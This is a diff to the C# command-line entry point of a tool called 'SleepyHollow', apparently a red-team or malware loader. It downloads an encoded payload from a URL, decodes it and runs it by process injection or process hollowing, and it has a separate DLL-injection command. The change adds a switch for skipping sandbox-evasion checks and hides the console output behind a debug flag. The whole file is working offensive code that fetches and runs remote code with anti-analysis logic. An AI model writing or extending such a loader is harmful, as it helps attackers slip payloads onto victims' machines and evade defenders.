@@ -25,41 +25,43 @@ var dllCommand = new Command("dll", "Injects and runs DLL"){
 };
 
 var rootCommand = new RootCommand("SleepyHollow");
+var skipEvasionOption = new Option<bool>("--skip-evasion", "Do not perform sandbox evasion checks");
+var debugOption = new Option<bool>("--debug", "Enable debug logging");
+rootCommand.AddGlobalOption(skipEvasionOption);
+rootCommand.AddGlobalOption(debugOption);
 rootCommand.AddCommand(scCommand);
 rootCommand.AddCommand(dllCommand);
 
 
-scCommand.SetHandler(async (url, method) =>
+scCommand.SetHandler(async (url, method, skipEvasion, debug) =>
 {
-    Console.WriteLine("Running checks...");
-    if (EvasionCheck.Detected)
+    if (!skipEvasion && EvasionCheck.Detected)
     {
         Console.WriteLine("Have a nice day!");
         Environment.Exit(0);
     }
-
+    if (debug) Console.WriteLine($"Downloading {url}...");
     var httpClient = new HttpClient();
     var data = await httpClient.GetStringAsync(url);
-    Console.WriteLine($"Downloaded {data.Length} bytes");
+    if (debug) Console.WriteLine($"Downloaded {data.Length} bytes");
     var buf = Decoder.DecodeString(data);
-    Console.WriteLine($"Decrypted payload to {buf.Length} bytes");
-    var inject = method.Equals("inject", StringComparison.OrdinalIgnoreCase);
+    if (debug) Console.WriteLine($"Decrypted payload to {buf.Length} bytes");
+    var inject = method?.Equals("inject", StringComparison.OrdinalIgnoreCase) ?? false;
     if (inject)
-        await InjectProcess.Run(buf);
+        await InjectProcess.Run(buf, debug: debug);
     else
-        await HollowProcess.Run(buf);
-}, payloadOption, methodOption);
+        await HollowProcess.Run(buf, debug: debug);
+}, payloadOption, methodOption, skipEvasionOption, debugOption);
 
-dllCommand.SetHandler(async (processName, dllName) =>
+dllCommand.SetHandler(async (processName, dllName, skipEvasion, debug) =>
 {
-    Console.WriteLine("Running checks...");
-    if (EvasionCheck.Detected)
+    if (!skipEvasion && EvasionCheck.Detected)
     {
         Console.WriteLine("Have a nice day!");
         Environment.Exit(0);
     }
 
-    await InjectDLL.Run(dllName, processName);
-}, processName, dllName);
+    await InjectDLL.Run(dllName, processName, debug);
+}, processName, dllName, skipEvasionOption, debugOption);
 
 await rootCommand.InvokeAsync(args);
